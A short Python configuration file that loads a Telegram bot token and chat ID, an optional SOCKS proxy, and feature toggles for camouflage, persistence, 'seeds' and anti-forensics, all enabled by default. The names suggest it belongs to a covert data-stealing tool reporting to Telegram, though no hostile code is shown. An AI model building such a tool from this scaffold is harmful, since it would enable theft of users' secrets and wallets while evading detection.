# utils/config.py

import os
from dotenv import load_dotenv

# Load environment variables from a .env file, if it exists
load_dotenv()

# Telegram Bot Token
BOT_TOKEN = os.getenv('BOT_TOKEN', 'your-default-token')
CHAT_ID = os.getenv("CHAT_ID")

# SOCKS Proxy (Optional)
SOCKS_PROXY = os.getenv('SOCKS_PROXY')

# You can also add other configuration variables here

# Feature Toggles
ENABLE_CAMOUFLAGE = os.getenv("ENABLE_CAMOUFLAGE", "True").lower() == "true"
ENABLE_PERSISTENCE = os.getenv("ENABLE_PERSISTENCE", "True").lower() == "true"
ENABLE_SEEDS = os.getenv("ENABLE_SEEDS", "True").lower() == "true"
ENABLE_ANTI_FORENSICS = os.getenv("ENABLE_ANTI_FORENSICS", "True").lower() == "true"
